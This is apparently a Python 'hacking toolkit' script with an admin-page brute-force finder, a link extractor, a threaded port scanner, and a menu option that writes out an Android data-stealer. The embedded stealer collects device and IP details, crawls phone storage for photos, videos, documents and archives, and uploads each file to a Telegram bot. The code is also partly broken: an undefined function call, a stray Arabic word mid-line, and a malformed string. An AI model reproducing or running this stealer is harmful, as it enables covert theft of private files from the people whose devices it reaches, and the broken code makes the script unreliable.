import requests, os, socket, threading
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
from queue import Queue
from time import sleep
from datetime import datetime
from colorama import Fore, Style
from pyfiglet import figlet_format
import platform


print_with_delay(figlet_format('MR_EREN', font='big', width=64))

def admin_page_finder():
    print(banner_admin_finder)
    t = 0
    url = input('[+] Enter Url (https://example.com/): ')
    file_path = input("Enter admin file path: ")
    if not url.endswith('/'):
        url += '/'

    try:
        admin_paths = open(file_path, 'r').read().splitlines()
    except FileNotFoundError:
        print('[!] Make sure you have downloaded (path.txt) file in the same directory')
        sleep(3)
        quit()

    for path in admin_paths:
        if not path.strip():
            continue
        admin_page = url + path + '/'
        head = {'user-agent': generate_user_agent()}
        check = requests.get(admin_page, headers=head).status_code
        if check == 200:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(banner_admin_finder)
            time = datetime.now().strftime('%H:%M:%S')
            print(f'url : {admin_page} | time : {time}')
            with open('admin.txt', 'a') as done_file:
                done_file.write(f'{admin_page}\n')
            break
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(banner_admin_finder)
            t += 1
            print(f'url : {admin_page} | Bad : {t}')
        sleep(0.5)

# Banner for Link Extractor
banner_link_extractor = ("""
 _____     _      __    _     _   _| |_ 
|   __|___| |_   |  |  |_|___| |_|   __|
|  |  | -_|  _|  |  |__| |   | '_|__   |
|_____|___|_|    |_____|_|_|_|_,_|_   _|
                                   |_|  
""")

def link_extractor():
    print(banner_link_extractor)
    url = input('[+] Enter site link: ')
    r = requests.get(url, headers={'user-agent': generate_user_agent()})
    if r.status_code == 200:
        print('[-] Extracting links...\n')
        soup = BeautifulSoup(r.text, 'html.parser')
        links = soup.find_all('a')
        for link in links:
            href = link.get('href', '').strip().replace(' ', '').replace('#', '')
            if href and href not in ['#', '/', '']:
                print(f'[-] {href}')
                with open('links.txt', 'a') as file:
                    file.write(f'{href}\n')
    else:
        print('[!] Bad site URL, try again')
        sleep(3)
        quit()

# Banner for Port Scanner
banner_port_scanner = (Fore.YELLOW + """
[!]
 ██▓███   ▒█████   ██▀███  ▄▄▄█████▓     ██████  ▄████▄   ▄▄▄       ███▄    █  ███▄    █ ▓█████  ██▀███  
▓██░  ██▒▒██▒  ██▒▓██ ▒ ██▒▓  ██▒ ▓▒   ▒██    ▒ ▒██▀ ▀█  ▒████▄     ██ ▀█   █  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
▓██░ ██▓▒▒██░  ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░   ░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██  ▀█ ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
▒██▄█▓▒ ▒▒██   ██░▒██▀▀█▄  ░ ▓██▓ ░      ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
▒██▒ ░  ░░ ████▓▒░░██▓ ▒██▒  ▒██▒ ░    ▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██░   ▓██░▒██░   ▓██░░▒████▒░██▓ ▒██▒
""" + Style.RESET_ALL)

queue = Queue()
open_ports = []

def port_scanner():
    print(banner_port_scanner)
    target = input(Fore.CYAN + "[+] Enter The URL (e.g., example.com): " + Style.RESET_ALL)
    if not target:
        print('[!] Invalid URL')
        sleep(3)
        return

    nport = input(Fore.CYAN + '[+] Range of ports (Default: 1024): ' + Style.RESET_ALL) or 1024
    thr = input(Fore.CYAN + '[+] Thread count (Default: 100): ' + Style.RESET_ALL) or 100

    try:
        host_ip = socket.gethostbyname(target)
    except socket.gaierror:
        print('[!] Invalid URL')
        return

    def port_scan(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host_ip, port))
            return True
        except:
            return False

    def fill_queue(port_list):
        for port in port_list:
            queue.put(port)

    def scan():
        while not queue.empty():
            port = queue.get()
            if port_scan(port):
                print(Fore.GREEN + f'[-] Port {port} is open' + Style.RESET_ALL)
                open_ports.append(port)

    port_list = range(1, int(nport))
    fill_queue(port_list)

    threads = [threading.Thread(target=scan) for _ in range(int(thr))]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()


def create_code_file():
    
    code = """
    import os
import time
import requests
import platform
import socket
import sys
from pyfiglet import figlet_format

Black = "\033[0;30m"
Red = "\033[0;31m"
Green = "\033[0;32m"
Yellow = "\033[0;33m"
Blue = "\033[0;34m"
Purple = "\033[0;35m"
Cyan = "\033[0;36m"
White = "\033[0;37m"


TOKEN = 'your token '  
CHAT_ID = "your id "
file_extensions = [
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg', '.webp',
    '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.3gp', '.mpeg', '.mpg',
    '.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.amr',
    '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.csv',
    '.rtf', '.odt', '.zip', '.rar', '.7z', '.tar', '.iso','.php','server','python','.','.json'
]


excluded_paths = [
    '/storage/emulated/0/Android/',  
]


def print_with_delay(text, delay=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()   


print_with_delay(f"{Cyan}{figlet_format('MR_EREN', font='big', width=64)}")


def send_info_to_telegram(info):
    try:
        res = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data={'chat_id': CHAT_ID, 'text': info})
        if res.status_code != 200:
            print(f"{Red}Error sending info: {res.status_code} - {res.text}")
    except Exception as e:
        print(f"{Red}Error sending info to Telegram: {str(e)}")


def get_system_info():
    system_info = platform.uname()
    hostname = socket.gethostname()
    internal_ip = socket.gethostbyname(hostname)

    try:
        external_ip = requests.get('https://api64.ipify.org?format=json').json()['ip']
    except Exception:
        external_ip = "Unable to retrieve external IP"

 
    network_type = "Unknown"
    try:
        result = os.popen('getprop wifi.interface').read()
        if result.strip():
            network_type = "Wi-Fi"
        else:
            network_type = "Mobile Data"
    except Exception:
        network_type = "Unknown"

    
    try:
        storage_stats = os.statvfs('/storage/emulated/0/')
        total = (storage_stats.f_frsize * storage_stats.f_blocks) / (1024 ** 3)
        free = (storage_stats.f_frsize * storage_stats.f_bfree) / (1024 ** 3)
        used = total - free
    except Exception as e:
        total, used, free = "Unknown", "Unknown", "Unknown"
        print(f"{Red}Error getting storage info: {str(e)}")

    info = f (""
    {Cyan}OS: {White}{system_info.system} {system_info.release}
    {Cyan}Version: {White}{system_info.version}
    {Cyan}Processor: {White}{system_info.processor}
    {Cyan}Hostname: {White}{hostname}
    {Cyan}Internal IP: {White}{internal_ip}
    {Cyan}External IP: {White}{external_ip}
    {Cyan}Network Type: {White}{network_type}
    {Cyan}Storage:
        {Yellow}Total: {White}{total:.2f} GB
        {Yellow}Used: {White}{used:.2f} GB
        {Yellow}Free: {White}{free:.2f} GB
        "")
        
    
    return info


def send_file_to_telegram(file_path):
    try:
        with open(file_path, 'rb') as file:
            res = requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                data={'chat_id': CHAT_ID},
                files={'document': file}
            )
            if res.status_code == 200:
                print_with_delay(f"{Green}File {Purple}{file_path}{Green} sent successfully.")
            else:
                print_with_delay(f"{Red}Failed to send file {Purple}{file_path}{Red}. Status Code: {res.status_code}")
    except Exception as e:
        print_with_delay(f"{Red}Error sending file {Purple}{file_path}{Red}: {str(e)}")


def search_and_send_files():
    start_paths = ['/storage/emulated/0/', '/storage/extSdCard/', '/data/', '/']   للبدء
    visited_paths = set()  

    path_lengths = [(path, len(path)) for path in start_paths]
    path_lengths.sort(key=lambda x: x[1])  

    for path_info in path_lengths:
        path = path_info[0]
        if any(excluded in path for excluded in excluded_paths):
            print_with_delay(f"{Red}Skipping excluded path: {path}")
            continue

        for root, dirs, files in os.walk(path):
            if root in visited_paths or any(excluded in root for excluded in excluded_paths):
                continue
            visited_paths.add(root)

            for file in files:
                if any(file.lower().endswith(ext) for ext in file_extensions):
                    file_path = os.path.join(root, file)
                    print_with_delay(f"{Cyan}Found file: {Purple}{file}{Cyan} in path: {White}{root}")
                    send_file_to_telegram(file_path)
                    time.sleep(0.01)  

if __name__ == "__main__":
    
    system_info = get_system_info()
    send_info_to_telegram(system_info)

  
    search_and_send_files()    
"""

    
    file_name = input("Enter the file name (with .py extension): ")

    
    with open(file_name, "w") as file:
        file.write(code)

    print(f"File '{file_name}' created successfully with the code inside.")


if __name__ == "__main__":
    print("Select the tool:")
    print("1. Admin Page Finder")
    print("2. Link Extractor")
    print("3. Port Scanner")
    print("4. Create a file that can extract all files and images from any Android device, but you must modify it as you wish")
    
    choice = input("Enter choice: ")
    if choice == '1':
        admin_page_finder()
    elif choice == '2':
        link_extractor()
    elif choice == '3':
        port_scanner()
    elif choice == '4':
        create_code_file()
    else:
        print("Invalid choice")